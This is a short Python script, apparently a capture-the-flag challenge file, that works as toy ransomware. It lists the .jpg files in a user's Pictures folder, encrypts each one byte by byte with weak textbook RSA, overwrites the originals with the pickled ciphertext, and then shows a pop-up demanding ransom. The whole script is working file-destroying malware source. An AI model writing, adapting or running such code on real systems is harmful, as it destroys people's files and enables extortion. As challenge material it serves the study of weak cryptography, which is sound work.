#!/usr/bin/env python3
import os,pickle,subprocess
n = 22291846172619859445381409012451
e = 65535
imgdir = '/home/csc2022/Pictures'
imgs = os.listdir(imgdir)
for img in imgs:
  if not img.endswith('.jpg'):
    continue
  plain = b''
  with open(imgdir+'/'+img,'rb') as f:
    plain = f.read()
  cipher = [pow(i,e,n) for i in plain]
  with open(imgdir+'/'+img,'wb') as f:
    pickle.dump(cipher,f)
subprocess.Popen('zenity --error --text=\"Give me ransom haha\"',shell=True)
